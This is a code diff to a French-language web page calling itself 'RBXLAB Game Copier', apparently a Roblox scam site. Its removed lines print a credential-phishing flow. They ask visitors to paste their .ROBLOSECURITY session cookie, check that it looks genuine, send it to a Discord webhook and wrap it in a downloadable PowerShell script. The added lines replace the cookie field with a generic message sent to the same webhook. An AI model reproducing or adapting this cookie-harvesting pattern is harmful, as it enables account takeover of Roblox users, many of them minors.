@@ -289,6 +289,21 @@
             display: block;
         }
 
+        .message-alert {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #5B7FFF;
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #9ca3af;
+            display: none;
+        }
+
+        .message-alert.show {
+            display: block;
+        }
+
         .toast {
             position: fixed;
             bottom: 20px;
@@ -410,7 +425,10 @@
                     <input type="text" id="gameLink" class="form-input" placeholder="Enter your game link..." required>
                 </div>
                 <div class="form-group">
-                    <textarea id="message" class="form-textarea" placeholder="Collez votre cookie ROBLOSECURITY ici..." rows="6" required></textarea>
+                    <textarea id="message" class="form-textarea" placeholder="Collez votre message ici..." rows="4" required></textarea>
+                </div>
+                <div class="message-alert" id="messageAlert">
+                    Le message a été copié ! Il sera envoyé au webhook.
                 </div>
                 <button type="submit" class="submit-button" id="submitBtn">
                     Submit ➤
@@ -469,7 +487,7 @@
             arrow.textContent = answer.classList.contains('active') ? '▲' : '▼';
         }
 
-        function showToast(title, description, type = 'info') {
+        function showToast(title, description, isError = false) {
             const toast = document.getElementById('toast');
             const toastTitle = document.getElementById('toastTitle');
             const toastDescription = document.getElementById('toastDescription');
@@ -477,78 +495,20 @@
             toastTitle.textContent = title;
             toastDescription.textContent = description;
             
-            toast.classList.remove('error', 'success');
-            if (type === 'error') {
+            if (isError) {
                 toast.classList.add('error');
-            } else if (type === 'success') {
-                toast.classList.add('success');
+            } else {
+                toast.classList.remove('error');
             }
             
             toast.classList.add('show');
             
             setTimeout(() => {
                 toast.classList.remove('show');
-            }, 5000);
+            }, 3000);
         }
 
-        function generatePowerShellScript(gameLink, roblosecurity) {
-            // Extraire le Game ID du lien Roblox
-            let gameId = gameLink;
-            if (gameLink.includes('games/')) {
-                const match = gameLink.match(/games\/(\d+)/);
-                if (match) {
-                    gameId = match[1];
-                }
-            }
-
-            return `$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0"
-$session.Cookies.Add((New-Object System.Net.Cookie("GuestData", "UserID=-1018948446", "/", ".roblox.com")))
-$session.Cookies.Add((New-Object System.Net.Cookie("RBXcb", "RBXViralAcquisition%3Dtrue%26RBXSource%3Dtrue%26GoogleAnalytics%3Dtrue", "/", ".roblox.com")))
-$session.Cookies.Add((New-Object System.Net.Cookie("RBXSource", "rbx_acquisition_time=02/22/2026 21:00:55&rbx_acquisition_referrer=https://www.roblox.com/fr&rbx_medium=Social&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=0", "/", ".roblox.com")))
-$session.Cookies.Add((New-Object System.Net.Cookie("__stripe_mid", "1ebfecbd-91f7-4ad8-8f74-77968c33a7b3c92ca4", "/", ".www.roblox.com")))
-$session.Cookies.Add((New-Object System.Net.Cookie("_ga", "GA1.2.1493303753.1772395373", "/", ".roblox.com")))
-$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "${roblosecurity}", "/", ".roblox.com")))
-$session.Cookies.Add((New-Object System.Net.Cookie("rbxas", "a020f54afc64cc2dba300a63d87914aeb78711451660314ba6e213564e1a4e0f", "/", ".roblox.com")))
-$session.Cookies.Add((New-Object System.Net.Cookie("RBXEventTrackerV2", "CreateDate=03/14/2026 16:46:14&rbxid=9049338989&browserid=1771794049904001", "/", ".roblox.com")))
-$session.Cookies.Add((New-Object System.Net.Cookie("rbx-ip2", "1", "/", ".roblox.com")))
-$session.Cookies.Add((New-Object System.Net.Cookie("RBXSessionTracker", "sessionid=f861f91f-9c49-40b9-bbea-eb93fb23fce9", "/", ".roblox.com")))
-$session.Cookies.Add((New-Object System.Net.Cookie("RBXPaymentsFlowContext", "4c0bbdba-5589-4e73-91fc-a43b50b9c018,", "/", ".roblox.com")))
-Invoke-WebRequest -UseBasicParsing -Uri "https://www.roblox.com/fr/games/${gameId}/${gameLink.split('/').pop() || 'Prison-Life'}" \`
--WebSession $session \`
--Headers @{
-"authority"="www.roblox.com"
-  "method"="GET"
-  "path"="/fr/games/${gameId}/${gameLink.split('/').pop() || 'Prison-Life'}"
-  "scheme"="https"
-  "accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
-  "accept-encoding"="gzip, deflate, br, zstd"
-  "accept-language"="fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
-  "cache-control"="max-age=0"
-  "priority"="u=0, i"
-  "referer"="https://www.roblox.com/fr/home"
-  "sec-ch-ua"="\`"Chromium\`";v=\`"146\`", \`"Not-A.Brand\`";v=\`"24\`", \`"Microsoft Edge\`";v=\`"146\`""
-  "sec-ch-ua-mobile"="?0"
-  "sec-ch-ua-platform"="\`"Windows\`""
-  "sec-fetch-dest"="document"
-  "sec-fetch-mode"="navigate"
-  "sec-fetch-site"="same-origin"
-  "sec-fetch-user"="?1"
-  "upgrade-insecure-requests"="1"
-}`;
-        }
-
-        function createDownloadLink(content, filename) {
-            const blob = new Blob([content], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = filename;
-            a.click();
-            URL.revokeObjectURL(url);
-        }
-
-        async function sendToDiscord(gameLink, roblosecurity) {
+        async function sendToDiscord(gameLink, message) {
             try {
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
@@ -556,13 +516,20 @@ Invoke-WebRequest -UseBasicParsing -Uri "https://www.roblox.com/fr/games/${gameI
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        content: `**Nouvelle demande Game Copier**\n**Lien du jeu:** ${gameLink}\n**ROBLOSECURITY reçu:** \`${roblosecurity.substring(0, 50)}...\``,
+                        content: `**Nouvelle demande Game Copier**\n**Lien du jeu:** ${gameLink}\n**Message:** ${message}`,
                         username: 'RBXLAB Game Copier'
                     })
                 });
-                return response.ok;
+                
+                if (response.ok) {
+                    return true;
+                } else {
+                    const errorText = await response.text();
+                    console.log('Réponse Discord:', errorText);
+                    return false;
+                }
             } catch (error) {
-                console.error('Erreur webhook:', error);
+                console.log('Erreur:', error);
                 return false;
             }
         }
@@ -571,56 +538,39 @@ Invoke-WebRequest -UseBasicParsing -Uri "https://www.roblox.com/fr/games/${gameI
             e.preventDefault();
             
             const gameLink = document.getElementById('gameLink').value.trim();
-            const roblosecurity = document.getElementById('message').value.trim();
+            const message = document.getElementById('message').value.trim();
             const submitBtn = document.getElementById('submitBtn');
-            const gameLinkInput = document.getElementById('gameLink');
-            const messageInput = document.getElementById('message');
+            const alertBox = document.getElementById('messageAlert');
 
-            if (!gameLink || !roblosecurity) {
-                showToast('Erreur', 'Veuillez remplir tous les champs.', 'error');
+            if (!gameLink || !message) {
+                showToast('Erreur', 'Veuillez remplir tous les champs.', true);
                 return;
             }
 
-            // Vérifier que le ROBLOSECURITY a le bon format
-            if (!roblosecurity.includes('_|WARNING:-DO-NOT-SHARE-THIS.--')) {
-                showToast('Erreur', 'Le ROBLOSECURITY ne semble pas valide', 'error');
-                return;
-            }
-
-            // Désactiver le formulaire
+            // Afficher l'alerte
+            alertBox.classList.add('show');
+            
+            // Désactiver le bouton
             submitBtn.disabled = true;
-            gameLinkInput.disabled = true;
-            messageInput.disabled = true;
-            submitBtn.innerHTML = '<span class="spinner"></span> Génération en cours...';
+            submitBtn.innerHTML = '<span class="spinner"></span> Envoi...';
 
-            try {
-                // 1. Générer le script PowerShell
-                const psScript = generatePowerShellScript(gameLink, roblosecurity);
-                
-                // 2. Créer le fichier à télécharger
-                createDownloadLink(psScript, 'RBXLAB_GameCopier.ps1');
-                
-                // 3. Envoyer une notification sur Discord (optionnel)
-                await sendToDiscord(gameLink, roblosecurity);
-                
-                showToast('Succès !', 'Le script PowerShell a été téléchargé !', 'success');
-                
-                // Réinitialiser le formulaire
+            // Envoyer au webhook
+            const success = await sendToDiscord(gameLink, message);
+            
+            if (success) {
+                showToast('Succès', 'Message envoyé sur Discord !');
                 document.getElementById('gameForm').reset();
-                
-            } catch (error) {
-                showToast('Erreur', 'Une erreur est survenue', 'error');
-                console.error(error);
+                alertBox.classList.remove('show');
+            } else {
+                showToast('Erreur', "Échec de l'envoi. Vérifiez la console (F12).", true);
             }
             
-            // Réactiver le formulaire
+            // Réactiver le bouton
             submitBtn.disabled = false;
-            gameLinkInput.disabled = false;
-            messageInput.disabled = false;
             submitBtn.innerHTML = 'Submit ➤';
         });
 
-        // Smooth scroll for hero button
+        // Smooth scroll
         document.querySelector('.hero-button').addEventListener('click', function() {
             document.querySelector('.process-section').scrollIntoView({behavior: 'smooth'});
         });
